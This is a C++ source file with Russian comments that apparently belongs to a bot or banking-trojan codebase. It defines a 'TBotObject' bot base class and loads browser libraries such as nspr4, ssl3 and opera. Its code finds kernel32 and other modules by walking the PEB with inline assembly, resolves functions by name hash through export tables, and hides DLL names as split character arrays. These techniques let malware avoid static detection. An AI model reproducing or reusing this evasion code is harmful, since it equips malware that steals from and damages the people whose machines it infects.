#include <windows.h>

#include "Getapi.h"
#include "Crypt.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "ntdll.h"

DWORD pGetLastError()
{
	DWORD dwRet = 0;

	__asm
	{
		MOV EAX,DWORD PTR FS:[18h]
		MOV EAX,DWORD PTR DS:[EAX+34h]
		MOV [dwRet], EAX
	}

	return dwRet;
}

HMODULE GetKernel32(void)
{    
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		WCHAR wcDllName[MAX_PATH];

		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );

        m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );

        if ( CalcHashW( m_wcslwr( wcDllName ) ) == 0x4B1FFE8E )
        {
            return (HMODULE)LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}

HMODULE GetDllBase( DWORD dwDllHash )
{    
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		WCHAR wcDllName[MAX_PATH];

		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );

        m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );

        if ( CalcHashW( m_wcslwr( wcDllName ) ) == dwDllHash )
        {
            return (HMODULE)LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}

LPVOID GetForvardedProc(PCHAR Name)
{
	// Функция обработки переназначения экспорта
	// На входе должна быть строка DllName.ProcName или DllName.#ProcNomber
	if (Name == NULL)
 		return NULL;

	char DLLName[255];
	m_memset(DLLName, 0, sizeof(DLLName));

	PCHAR NameStr = STR::Scan(Name, '.');
	if (NameStr == NULL)
		return NULL;

	// Собираем имя библиотеки
	m_memcpy(DLLName, Name, NameStr - Name);

	m_lstrcat(DLLName, ".dll");

	// определяем имя функции
	NameStr++;
	if (*NameStr == '#')
	{
		// Имя является номером функции
		NameStr++;
		DWORD OrdNomber = m_atoi(NameStr);
		return GetProcAddressEx(DLLName, 0, OrdNomber);
	}
	DWORD Hash = CalcHash(NameStr);
	return GetProcAddressEx(DLLName, 0, Hash);
}


LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
{
	/*----------- Функция возвращает адрем функции по её названию -----------*/

    // Получаем адрес дополнительных PE заголовков
	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)Module + ( (PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

	// Получаем адрес таблицы експорта
	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module,	poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	int Ordinal = 0; // Норем необходимой нам функции

	if ( HIWORD(ProcNameHash) == 0 )
	{
		// Ищем функцию по её номеру
		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;
	}
	else
	{
		// Ищем функцию по номеру
		PDWORD NamesTable  = (DWORD*)RVATOVA(Module, Table->AddressOfNames );
		PWORD  OrdinalTable =  (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);

		unsigned int i;
		char * ProcName;
		for ( i = 0; i < Table->NumberOfNames; i++)
		{
			ProcName = (char*)RVATOVA(Module, *NamesTable);
			if (CalcHash(ProcName) == ProcNameHash )
			{
				Ordinal = *OrdinalTable;
				break;
			}
			// Увеличиваем позицию в таблице
			NamesTable++;
			OrdinalTable++;
		}
	}

	// не нашли номер
	if (Ordinal == 0)
		return NULL;

	// Определяем адрес функции
	PDWORD AddrTable  = (PDWORD)RVATOVA(Module, Table->AddressOfFunctions);
	DWORD RVA		  = AddrTable[Ordinal];
	DWORD Ret		  = (DWORD)RVATOVA(Module, RVA );

	// проверяем на переназначение экспорта
	if (Ret > (DWORD)Table && (Ret - (DWORD)Table < DataSize))
		Ret = (DWORD)GetForvardedProc((PCHAR)Ret);

	return (LPVOID)Ret;
}


LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
{

//-----------------------------------------------------------------------------

	// Названия используемых библиотек
	const static char last_char = 0xf2;
	//char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
	const static char advapi32_dll[] = {'a','d','v','a','p','i','3','2','.','d','l','l',last_char};
	const static char user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',last_char};
	const static char ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',last_char};
	const static char ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',last_char};
	const static char winsta_dll[]   = {'w','i','n','s','t','a','.','d','l','l',last_char};
	const static char shell32_dll[]  = {'s','h','e','l','l','3','2','.','d','l','l',last_char};
	const static char wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',last_char};
	const static char urlmon_dll[]   = {'u','r','l','m','o','n','.','d','l','l',last_char};
	const static char nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',last_char};
	const static char ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',last_char};
	const static char winmm_dll[]	 = {'w','i','n','m','m','.','d','l','l',last_char};
	const static char cabinet_dll[]  = {'c','a','b','i','n','e','t','.','d','l','l',last_char};
	const static char opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',last_char};
	const static char gdi32_dll[]    = {'G', 'd', 'i', '3', '2', '.', 'd', 'l', 'l',  last_char};
	const static char gdiPlus_dll[]  = {'g','d','i','p','l','u','s','.','d','l','l', last_char};
	const static char crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',last_char};
	const static char SHLWAPI_dll[]  = {'S','H','L','W','A','P','I','.','d','l','l',last_char};
	const static char IMAGEHLP_dll[] = {'I','m','a','g','e','h','l','p','.','d','l','l',last_char};
	const static char PSAPI_dll[]	 = {'p','s','a','p','i','.','d','l','l',last_char};
	const static char OLE32_dll[]	 = {'o','l','E','3','2','.','d','l','l',last_char};
	const static char WINSPOOL_dll[] = {'w','i','n','s','p','o','o','l','.','d','r','v',last_char};
	//-----------------------------------------------------------------------
	HMODULE Module = NULL;
	char buf_dll[128]; 

	char *DllName = Dll;

	if (DllName == NULL)
	{
		switch ( dwModule ) 
		{
			case 1: 
				Module = GetKernel32();
				break;

			case 2:
				DllName = (PCHAR)advapi32_dll;
				break;

			case 3:
				DllName = (PCHAR)user32_dll;
				break;

			case 4:
				DllName = (PCHAR)ws2_32_dll;
				break;

			case 5:
				DllName = (PCHAR)ntdll_dll;
				break;

			case 6:
				DllName = (PCHAR)winsta_dll;
				break;

			case 7:
				DllName = (PCHAR)shell32_dll;
				break;

			case 8:
				DllName = (PCHAR)wininet_dll;
				break;

			case 9:
				DllName = (PCHAR)urlmon_dll;
				break;

			case 10:
				DllName = (PCHAR)nspr4_dll;
				break;

			case 11:
				DllName = (PCHAR)ssl3_dll;
				break;

			case 12:
				DllName = (PCHAR)winmm_dll;// для вырубания звука
				break;

			case 13:
				DllName = (PCHAR)cabinet_dll;//для архивирования
				break;

			case 14:
				DllName = (PCHAR)opera_dll;//для оперы
				break;

			case DLL_GDI:
				DllName = (PCHAR)gdi32_dll; break;

			case DLL_GDIPLUS:
				DllName = (PCHAR)gdiPlus_dll; break;

			case DLL_CRYPT32:
				DllName = (PCHAR)crypt32_dll; break;

			case DLL_SHLWAPI:
				DllName = (PCHAR)SHLWAPI_dll;
				break;
			case DLL_IMAGEHLP:
				DllName = (PCHAR)IMAGEHLP_dll;
				break;
			case DLL_PSAPI:
				DllName = (PCHAR)PSAPI_dll;
				break;
			case DLL_OLE32:
				DllName = (PCHAR)OLE32_dll;
				break;
			case DLL_WINSPOOL:
				DllName = (PCHAR)WINSPOOL_dll;
				break;
			default:
				return 0;
		}

		{
			
			if ( DllName )
			{
				for (int i=0; i<sizeof(buf_dll); ++i)
				if (DllName[i] == last_char)
				{
					m_memcpy(buf_dll,DllName,i);
					buf_dll[i] = 0;
					DllName = buf_dll;
					break;
				};
			};
		};

	}

	
	if (Module == NULL && !STR::IsEmpty(DllName))
	{
		Module = (HMODULE)pGetModuleHandleA(DllName);
		if (Module == NULL)
			Module = (HMODULE)pLoadLibraryA(DllName);
	}

	/*LPVOID ret = (LPVOID)0x00000000; так было ранее

	if (hModule != NULL)
		ret = GetApiAddr( hModule, dwProcNameHash );*/
/***/ // так стало

	if (dwProcNameHash == 0)
		return Module;

	LPVOID ret = GetApiAddr(Module, dwProcNameHash);

	if ( ret == NULL )
		return (LPVOID)0x00000000;

	return ret;
} 

//****************************************************************
//  TBotObject - базовый класс бота
//****************************************************************

void* TBotObject::operator new(size_t size)
{
	return HEAP::Alloc(size);
}

void* TBotObject::operator new[](size_t size)
{
	return HEAP::Alloc(size);
}

void  TBotObject::operator delete(void* Pointer)
{
	HEAP::Free(Pointer);
}

void  TBotObject::operator delete[](void* Pointer)
{
	HEAP::Free(Pointer);
}
